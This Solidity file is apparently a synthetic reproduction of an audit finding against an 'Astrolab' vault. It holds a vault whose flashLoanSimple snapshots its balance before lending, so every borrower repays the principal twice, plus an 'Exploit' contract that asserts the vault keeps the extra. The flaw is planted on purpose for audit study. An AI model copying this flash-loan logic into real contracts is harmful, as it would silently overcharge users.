// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Astrolab — flashLoanSimple snapshots the balance before the loan leaves
    (Pashov Audit Group, H-02). SYNTHETIC, cheatcode-free.
    fees.flash is 0, so toRepay equals amount. balanceBefore is taken while
    the tokens are still in the vault, and the check wants
    balanceAfter - balanceBefore >= amount. The borrower must return the
    principal twice. The vault keeps an extra 1000. The vault pre-approves
    itself so the separate transferFrom-allowance bug does not hide this one. */

interface IFlashLoanReceiver {
    function executeOperation(address asset, uint256 amount, uint256 fee, address initiator, bytes calldata params)
        external
        returns (bool);
}

contract Asset {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function safeTransferFrom(address from, address to, uint256 amount) external {
        transferFrom(from, to, amount);
    }
}

contract As4626 {
    Asset public asset;
    uint256 public totalLent;

    error FlashLoanDefault(address borrower, uint256 amount);

    constructor(Asset _asset) {
        asset = _asset;
        _asset.approve(address(this), type(uint256).max);
    }

    function flashLoanSimple(address receiver, uint256 amount, bytes calldata params) external {
        uint256 fee = 0;
        uint256 toRepay = amount + fee;
        // @> VULN: balanceBefore is recorded before the loan is transferred, so the check below demands `amount` on top of repayment.
        uint256 balanceBefore = asset.balanceOf(address(this));
        totalLent += amount;
        asset.safeTransferFrom(address(this), receiver, amount);
        IFlashLoanReceiver(receiver).executeOperation(address(asset), amount, fee, msg.sender, params);
        if ((asset.balanceOf(address(this)) - balanceBefore) < toRepay) {
            revert FlashLoanDefault(msg.sender, amount);
        }
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;

    Asset public asset; // nonce 1
    As4626 public vault; // nonce 2
    uint256 public repaid;
    uint256 public vaultBefore;
    uint256 public vaultAfter;

    constructor() {
        asset = new Asset();
        vault = new As4626(asset);
        asset.mint(address(vault), AMOUNT);
        asset.mint(address(this), AMOUNT);
    }

    function executeOperation(address, uint256 amount, uint256, address, bytes calldata) external returns (bool) {
        repaid = amount * 2;
        asset.transfer(msg.sender, repaid);
        return true;
    }

    function run() external {
        vaultBefore = asset.balanceOf(address(vault));
        vault.flashLoanSimple(address(this), AMOUNT, "");
        vaultAfter = asset.balanceOf(address(vault));
        require(vaultBefore == AMOUNT, "vault did not start with 1000");
        require(repaid == AMOUNT * 2, "borrower did not return 2000");
        require(vaultAfter == AMOUNT * 2, "vault did not keep 2000");
        require(vaultAfter - vaultBefore == AMOUNT, "extra kept is not 1000");
        require(asset.balanceOf(address(this)) == 0, "borrower still holds the extra");
    }
}
